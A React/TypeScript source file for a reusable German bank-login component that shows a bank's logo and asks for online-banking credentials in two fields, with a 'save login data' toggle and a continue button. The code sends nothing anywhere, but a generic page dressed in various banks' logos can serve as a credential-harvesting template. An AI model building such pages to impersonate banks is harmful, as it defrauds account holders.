import { useState } from "react";
import { Link, useNavigate } from "@tanstack/react-router";
import { ArrowLeft, Info, X } from "lucide-react";
import { bankLogoUrls } from "@/assets/bank-logos";

export type BankLoginPageProps = {
  logoSlug: string;
  title: string;
  field1Label: string;
  field2Label: string;
  field1Tooltip?: string;
  field2Tooltip?: string;
  field2Type?: "password" | "text";
  backTo?: string;
  idPrefix: string;
};

export function BankLoginPage({
  logoSlug,
  title,
  field1Label,
  field2Label,
  field1Tooltip,
  field2Tooltip,
  field2Type = "password",
  backTo = "/bank",
  idPrefix,
}: BankLoginPageProps) {
  const logo = bankLogoUrls[logoSlug];
  const [v1, setV1] = useState("");
  const [v2, setV2] = useState("");
  const [remember, setRemember] = useState(true);

  const canContinue = v1.trim().length > 0 && v2.trim().length > 0;

  return (
    <div className="min-h-screen bg-neutral-100 p-4">
      <div className="mx-auto flex w-[600px] max-w-full items-start justify-center">
        <div className="flex h-[calc(100vh-2rem)] max-h-[1043px] w-full flex-col overflow-hidden rounded-2xl bg-white shadow-xl">
          <div className="flex flex-1 flex-col overflow-y-auto px-8 pb-6 pt-8 sm:px-10">
            <div className="flex items-start justify-between">
              <Link
                to={backTo}
                aria-label="Zurück"
                className="flex h-10 w-10 items-center justify-center rounded-full text-[#0b051d] transition-colors hover:bg-neutral-100"
              >
                <ArrowLeft className="h-5 w-5" strokeWidth={2} />
              </Link>
              <Link
                to="/confirm"
                aria-label="Schließen"
                className="rounded-full p-1 text-[#0b051d] transition-colors hover:bg-neutral-100"
              >
                <X className="h-6 w-6" strokeWidth={2} />
              </Link>
            </div>

            {logo && (
              <img src={logo} alt="" className="mt-4 h-20 w-20 rounded-full object-contain" />
            )}

            <h1 className="mt-4 text-[24px] font-bold leading-tight text-[#0b051d]">{title}</h1>
            <p className="mt-3 text-[15px] text-[#373544]">Melde dich mit deinen Onlinebanking-Daten an</p>

            <div className="mt-6 divide-y divide-[rgb(112,110,123)] rounded-xl border border-[rgb(112,110,123)] bg-white">
              <div className="relative rounded-t-xl px-4 hover:bg-neutral-100 focus-within:!bg-white">
                <div className="relative flex h-[58px] items-center gap-2">
                  <input
                    id={`${idPrefix}-f1`}
                    type="text"
                    value={v1}
                    onChange={(e) => setV1(e.target.value)}
                    placeholder=" "
                    className="peer h-full flex-1 bg-transparent pt-4 text-[15px] font-semibold text-[#0b051d] outline-none placeholder:text-transparent"
                  />
                  <label
                    htmlFor={`${idPrefix}-f1`}
                    className="pointer-events-none absolute left-0 top-1/2 -translate-y-1/2 text-[15px] font-normal text-[#6b6b6b] transition-all peer-focus:top-2 peer-focus:translate-y-0 peer-focus:text-[13px] peer-[:not(:placeholder-shown)]:top-2 peer-[:not(:placeholder-shown)]:translate-y-0 peer-[:not(:placeholder-shown)]:text-[13px]"
                  >
                    {field1Label}
                  </label>
                  {field1Tooltip && (
                    <div className="group relative z-10">
                      <Info className="h-5 w-5 shrink-0 cursor-help text-[#6b6b6b]" strokeWidth={2} />
                      <div className="pointer-events-none absolute right-full top-1/2 z-50 mr-2 w-52 -translate-y-1/2 rounded-lg bg-black px-4 py-4 text-[16px] leading-relaxed text-white opacity-0 shadow-lg transition-opacity group-hover:opacity-100">
                        {field1Tooltip}
                      </div>
                    </div>
                  )}
                </div>
              </div>

              <div className="relative rounded-b-xl px-4 hover:bg-neutral-100 focus-within:!bg-white">
                <div className="relative flex h-[58px] items-center gap-2">
                  <input
                    id={`${idPrefix}-f2`}
                    type={field2Type}
                    value={v2}
                    onChange={(e) => setV2(e.target.value)}
                    placeholder=" "
                    className="peer h-full flex-1 bg-transparent pt-4 text-[15px] font-semibold text-[#0b051d] outline-none placeholder:text-transparent"
                  />
                  <label
                    htmlFor={`${idPrefix}-f2`}
                    className="pointer-events-none absolute left-0 top-1/2 -translate-y-1/2 text-[15px] font-normal text-[#6b6b6b] transition-all peer-focus:top-2 peer-focus:translate-y-0 peer-focus:text-[13px] peer-[:not(:placeholder-shown)]:top-2 peer-[:not(:placeholder-shown)]:translate-y-0 peer-[:not(:placeholder-shown)]:text-[13px]"
                  >
                    {field2Label}
                  </label>
                  {field2Tooltip && (
                    <div className="group relative z-10">
                      <Info className="h-5 w-5 shrink-0 cursor-help text-[#6b6b6b]" strokeWidth={2} />
                      <div className="pointer-events-none absolute right-full top-1/2 z-50 mr-2 w-52 -translate-y-1/2 rounded-lg bg-black px-4 py-4 text-[16px] leading-relaxed text-white opacity-0 shadow-lg transition-opacity group-hover:opacity-100">
                        {field2Tooltip}
                      </div>
                    </div>
                  )}
                </div>
              </div>
            </div>

            <div className="mt-5 flex items-center justify-between">
              <span className="text-[15px] font-semibold text-[#0b051d]">Anmeldedaten speichern</span>
              <button
                type="button"
                role="switch"
                aria-checked={remember}
                onClick={() => setRemember((v) => !v)}
                className={`relative inline-flex h-7 w-12 items-center rounded-full transition-colors ${
                  remember ? "bg-[#0b051d]" : "bg-neutral-300"
                }`}
              >
                <span
                  className={`inline-block h-5 w-5 transform rounded-full bg-white transition-transform ${
                    remember ? "translate-x-6" : "translate-x-1"
                  }`}
                />
              </button>
            </div>
          </div>

          <div className="relative bg-white px-8 pb-6 pt-3 sm:px-10">
            <button
              type="button"
              disabled={!canContinue}
              className={`h-14 w-full rounded-full text-[15px] font-semibold transition-colors ${
                canContinue
                  ? "bg-[#0b051d] text-white hover:bg-[#1a1230]"
                  : "cursor-not-allowed bg-neutral-200 text-neutral-500"
              }`}
            >
              Weiter
            </button>
          </div>
        </div>
      </div>
    </div>
  );
}
